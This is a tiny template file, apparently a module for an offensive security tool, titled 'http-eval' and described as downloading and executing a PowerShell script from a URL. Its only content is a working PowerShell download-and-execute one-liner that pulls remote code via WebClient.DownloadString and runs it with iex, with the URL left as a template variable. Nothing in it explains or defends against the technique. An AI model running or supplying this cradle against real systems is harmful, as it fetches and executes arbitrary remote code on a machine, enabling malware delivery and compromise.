##########
Name: "http-eval"
Author: "bongtrop"
Description: "Download and execute ps1 script from URL"
Options:
    url: "ps1 script's URL"
##########
iex(New-Object System.Net.WebClient).DownloadString('{{ url }}');